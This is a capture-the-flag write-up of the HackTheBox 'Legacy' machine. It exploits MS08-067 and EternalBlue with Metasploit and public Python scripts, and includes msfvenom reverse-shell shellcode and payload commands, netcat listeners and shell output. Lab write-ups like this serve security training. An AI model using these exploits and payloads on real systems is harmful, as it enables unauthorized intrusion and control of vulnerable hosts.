---
title: HackTheBox Legacy Writeup
authors: Samarth
date: 2022-12-20 20:15:00 +0530
categories: [HackTheBox Machines]
tags: [SMB , Eternal Blue, Windows]
math: true
mermaid: true
---

![Legacy - HTB](/assets/images/writeups/Legacy-HTB/banner.png)

## TL;DR

This writeup is based on [__Legacy__](https://app.hackthebox.com/machines/Legacy){:target="_blank"} on Hack the box. It was a windows box. It starts with Samba.
In this machine, Samba has two bugs, which are SMB vulnerability(Eternal Blue or MS17-010) and 
Remote Code Execution vulnerability (MS08-067). We have both ways to exploit the vulnerability 
and get the shell. In this write-up, we will see both ways of exploitation. There is no 
privilege escalation needed for the user flag and root flag.

## Scanning Network

I started with a Nmap scan, I found ports 139, 445 as NetBIOS-ssn and Microsoft-ds, respectively. 
Let’s do an intense scan ( -sV -A -T4 -vv) and with vulnerability script to identify more 
information about the machine. Let’s see the Nmap results.

```bash
 Command - nmap -sV -A -T4 -vv --script vuln 10.129.1.111

 Nmap scan report for 10.129.1.111
 Host is up (0.57s latency).
 Not shown: 996 filtered ports
 PORT     STATE   SERVICE          VERSION
 139/tcp  open    netbios-ssn    Microsoft Windows netbios-ssn
 445/tcp  open    microsoft-ds   Microsoft Windows XP microsoft-ds

 Host script results:
 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
 | smb-vuln-ms08-067: 
 |   VULNERABLE:
 |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2008-4250
 |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
 |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
 |           code via a crafted RPC request that triggers the overflow during path canonicalization.
 |           
 |     Disclosure date: 2008-10-23
 |     References:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
 |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
 |_smb-vuln-ms10-054: false
 |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
 | smb-vuln-ms17-010: 
 |   VULNERABLE:
 |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2017-0143
 |     Risk factor: HIGH
 |       A critical remote code execution vulnerability exists in Microsoft SMBv1
 |        servers (ms17-010).
 |           
 |     Disclosure date: 2017-03-14
 |     References:
 |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
In the Nmap scan we got Samba’s version which is “Windows XP Microsoft-ds” using Nmap’s vulnerability
scripts, we identified that the target is vulnerable to MS08-067 and MS17-010. Since we have Remote
Code Execution and Samba SMBv1 exploitation. Now, let’s move to exploitation phase.

## Exploitation

### MS08-067 (Using Metasploit)

Let’s find the exploit using [__Metasploit__](https://www.metasploit.com/){:target="_blank"}.

```bash
 msf6 > search ms08-067
 Matching Modules
 #  Name                                 Disclosure Date  Rank   Check  Description
    ----                                 ---------------  ----   -----  -----------
 0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service     
                                                                        Relative Path Stack Corruption
```

[__MS08-067__](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/){:target="_blank"} is a remote code execution vulnerability that allows attackers to take complete control of an 
affected system remotely. On Microsoft Windows 2000-based, Windows XP-based, and Windows Server 2003-based 
systems, an attacker could exploit this vulnerability over RPC without authentication and could run 
arbitrary code. So we will use “use 0” to select the exploit and change the options into it.

```bash
 sf6 > use 0
msf6 exploit(windows/smb/ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
RPORT    445              yes       The SMB service port (TCP)
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
Payload options (windows/meterpreter/reverse_tcp):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
 LHOST     192.168.232.139  yes       The listen address (an interface may be specified)
 LPORT     4444             yes       The listen port
 
 msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.1.111
 RHOSTS => 10.129.1.111
 msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
 LHOST => 10.10.14.44
 msf6 exploit(windows/smb/ms08_067_netapi) > exploit

 meterpreter > shell
 Process 1916 created.
 Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 C:\WINDOWS\system32>
```
To know about RHOSTS, LHOST, RPORT, and LPORT take reference from my [__Lame__](https://samh4cks.github.io/lame/#){:target="_blank"} writeup. With this exploit, 
we get the shell. Now, let’s move to another exploit (MS17-010).

### MS017-010 (Using Metasploit)

```bash
 msf6 > search ms17-010
 Matching Modules
 #  Name                                           Disclosure Date  Rank     Check  Description
    ----                                           ---------------  ----     -----  -----------
 0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
 1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
 2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
 4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
 5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution 
```
[__MS17-010__](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/){:target="_blank"} is also known as EternalBlue exploit by Microsoft, that affects only Windows Operating System which
uses the SMBv1 (Server Message Block version 1). SMBv1 is a network communication protocol which enable 
shared access to files, printers and ports. Later on, it is very risky of being targeted by ransomware and 
other attacks.

As all the exploits are mentioned above, I will choose the appropriate for Remote Code Execution, that is,
exploit/windows/smb/ms17_010_psexec (use 4).

```bash
 msf6 > use 4
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_psexec) > show options
 Module options (exploit/windows/smb/ms17_010_psexec):
 Name                  Current Setting                                             Required  Description
 ----                  ---------------                                             --------  -----------
DBGTRACE              false                                                         yes       Show extra debug trace info
LEAKATTEMPTS          99                                                            yes       How many times to try to leak transaction
NAMEDPIPE                                                                           no        A named pipe that can be connected to (leave blank for auto)
NAMED_PIPES         /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
RHOSTS                                                                              yes       The target host(s)
RPORT                 445                                                           yes       The Target port (TCP)
SERVICE_DESCRIPTION                                                                 no        Service description 
SERVICE_DISPLAY_NAME                                                                no        The service display name
SERVICE_NAME                                                                        no        The service name
SHARE                 ADMIN$                                                        yes       The share to connect to
SMBDomain             .                                                             no        The Windows domain to use for authentication
SMBPass                                                                             no        The password for the specified username
SMBUser                                                                             no        The username to authenticate as
Payload options (windows/meterpreter/reverse_tcp):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
 LHOST     192.168.232.139  yes       The listen address (an interface may be specified)
 LPORT     4444             yes       The listen port
 Exploit target:
 Id  Name
 --  ----
 0   Automatic
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.1.111
 RHOSTS => 10.129.1.111
 msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
 LHOST => 10.10.14.44
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit

 meterpreter > shell
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 C:\WINDOWS\system32>
```
### MS08-067 (Without Metasploit)

For exploiting the Samba manually, there is an exploit available on GitHub [__here__](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py){:target="_blank"}. It’s a python script that
requires Impacket (you can install it on Kali from [__here__](https://github.com/CoreSecurity/impacket/)){:target="_blank"} and have to implement some of my own code with 
the default shellcode. Let’s make the custom exploit for exploitation. I will use msfvenom to make the 
shellcode.

```bash
 root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows                
 Found 11 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
 Attempting to encode payload with 1 iterations of generic/none
 generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
 Attempting to encode payload with 1 iterations of x86/call4_dword_xor
 x86/call4_dword_xor succeeded with size 348 (iteration=0)
 x86/call4_dword_xor chosen with final size 348
 Payload size: 348 bytes
 Final size of py file: 1953 bytes
 shellcode =  b""
 shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
 shellcode += b"\x5e\x81\x76\x0e\xa1\x97\xf8\xe2\x83\xee\xfc"
 shellcode += b"\xe2\xf4\x5d\x7f\x7a\xe2\xa1\x97\x98\x6b\x44"
 shellcode += b"\xa6\x38\x86\x2a\xc7\xc8\x69\xf3\x9b\x73\xb0"
 shellcode += b"\xb5\x1c\x8a\xca\xae\x20\xb2\xc4\x90\x68\x54"
 shellcode += b"\xde\xc0\xeb\xfa\xce\x81\x56\x37\xef\xa0\x50"
 shellcode += b"\x1a\x10\xf3\xc0\x73\xb0\xb1\x1c\xb2\xde\x2a"
 shellcode += b"\xdb\xe9\x9a\x42\xdf\xf9\x33\xf0\x1c\xa1\xc2"
 shellcode += b"\xa0\x44\x73\xab\xb9\x74\xc2\xab\x2a\xa3\x73"
 shellcode += b"\xe3\x77\xa6\x07\x4e\x60\x58\xf5\xe3\x66\xaf"
 shellcode += b"\x18\x97\x57\x94\x85\x1a\x9a\xea\xdc\x97\x45"
 shellcode += b"\xcf\x73\xba\x85\x96\x2b\x84\x2a\x9b\xb3\x69"
 shellcode += b"\xf9\x8b\xf9\x31\x2a\x93\x73\xe3\x71\x1e\xbc"
 shellcode += b"\xc6\x85\xcc\xa3\x83\xf8\xcd\xa9\x1d\x41\xc8"
 shellcode += b"\xa7\xb8\x2a\x85\x13\x6f\xfc\xff\xcb\xd0\xa1"
 shellcode += b"\x97\x90\x95\xd2\xa5\xa7\xb6\xc9\xdb\x8f\xc4"
 shellcode += b"\xa6\x68\x2d\x5a\x31\x96\xf8\xe2\x88\x53\xac"
 shellcode += b"\xb2\xc9\xbe\x78\x89\xa1\x68\x2d\xb2\xf1\xc7"
 shellcode += b"\xa8\xa2\xf1\xd7\xa8\x8a\x4b\x98\x27\x02\x5e"
 shellcode += b"\x42\x6f\x88\xa4\xff\xf2\xe8\xaf\xbb\x90\xe0"
 shellcode += b"\xa1\x96\x43\x6b\x47\xfd\xe8\xb4\xf6\xff\x61"
 shellcode += b"\x47\xd5\xf6\x07\x37\x24\x57\x8c\xee\x5e\xd9"
 shellcode += b"\xf0\x97\x4d\xff\x08\x57\x03\xc1\x07\x37\xc9"
 shellcode += b"\xf4\x95\x86\xa1\x1e\x1b\xb5\xf6\xc0\xc9\x14"
 shellcode += b"\xcb\x85\xa1\xb4\x43\x6a\x9e\x25\xe5\xb3\xc4"
 shellcode += b"\xe3\xa0\x1a\xbc\xc6\xb1\x51\xf8\xa6\xf5\xc7"
 shellcode += b"\xae\xb4\xf7\xd1\xae\xac\xf7\xc1\xab\xb4\xc9"
 shellcode += b"\xee\x34\xdd\x27\x68\x2d\x6b\x41\xd9\xae\xa4"
 shellcode += b"\x5e\xa7\x90\xea\x26\x8a\x98\x1d\x74\x2c\x18"
 shellcode += b"\xff\x8b\x9d\x90\x44\x34\x2a\x65\x1d\x74\xab"
 shellcode += b"\xfe\x9e\xab\x17\x03\x02\xd4\x92\x43\xa5\xb2"
 shellcode += b"\xe5\x97\x88\xa1\xc4\x07\x37"
```
Shellcode contains:

-p windows/shell_reverse_shell – It will connect me with a shell.
LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread – Defining the variable for the payload, my IP, the port 
and how to exit.

  -b “\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40” – Bad characters not to use.
  -f py – Output in python format.
  -v shellcode – Code set the variable shellcode, instead of default, buf.
  -a x86 and –platform windows – Describing attacker’s enviornment
  
In the exploit, you have to upload your system generated shellcode at the place of default. Also setup
netcat for listening the system shell.

```bash
 root@kali# python ms08-067.py 10.129.1.111 6 445    
#######################################################################                                                                                                 
# MS08-067 Exploit
# This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
# The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
# Mod in 2018 by Andy Acer
# - Added support for selecting a target port at the command line.
# - Changed library calls to allow for establishing a NetBIOS session for SMB transport
# - Changed shellcode handling to allow for variable length shellcode.
########################################################################
 $   This version requires the Python Impacket library version to 0_9_17 or newer.
 $
 $   Here's how to upgrade if necessary:
 $
 $   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
 $   cd impacket
 $   pip install .
 #
 Windows XP SP3 English (NX)
 [-]Initiating connection
 [-]connected to ncacn_np:10.129.1.111[\pipe\browser]
 Exploit finish
```
I get a callback on my listener.

```bash
 root@kali# nc -lnvp 443                                                                                                                                                       
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
 Ncat: Connection from 10.129.1.111.
 Ncat: Connection from 10.129.1.111:1028.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 C:\WINDOWS\system32>
```
### MS17-010 (Without Metasploit)

There are few MS17-010 code available on GitHub, but I like to go with this one by Helviojunior. The 
name of code is send_and_execute.py, so we can upload the payload file using this exploit and run it.
Now, we can generate the exe file with msfvenom.

```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe                                        
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 Saved as: reverse-shell.exe
```
Also, I will open the netcat for listening.

```bash
 root@kali:/opt/MS17-010# python send_and_execute.py 10.129.1.111 reverse-shell.exe 
 Trying to connect to 10.129.1.111:445
 Target OS: Windows 5.1
 Using named pipe: browser
 Groom packets
 attempt controlling next transaction on x86
 success controlling one transaction
 modify parameter count to 0xffffffff to be able to write backward
 leak next transaction
 CONNECTION: 0x81b74c28
 SESSION: 0xe1bd1a70
 FLINK: 0x7bd48
 InData: 0x7ae28
 MID: 0xa
 TRANS1: 0x78b50
 TRANS2: 0x7ac90
 modify transaction struct for arbitrary read/write
 make this SMB session to be SYSTEM
 current TOKEN addr: 0xe22ed998
 userAndGroupCount: 0x3
 userAndGroupsAddr: 0xe22eda38
 overwriting token UserAndGroups
 Sending file GPHZ28.exe…
 Opening SVCManager on 10.129.1.111…..
 Creating service yDOZ…..
 Starting service yDOZ…..
 The NETBIOS connection with the remote host timed out.
 Removing service yDOZ…..
 ServiceExec Error on: 10.129.1.111
 nca_s_proto_error
```

```bash
 root@kali:~# nc -nlvp 443                                                                                                                                                           
 listening on [any] 443 …
 connect to [10.10.14.44] from (UNKNOWN) [10.129.1.111] 1032
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 C:\WINDOWS\system32>net user
 net user
 User accounts for \\
 
 Administrator            Guest                    HelpAssistant            
 john                     SUPPORT_388945a0         
 The command completed with one or more errors.
 zsh: parse error near `Copyright'
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.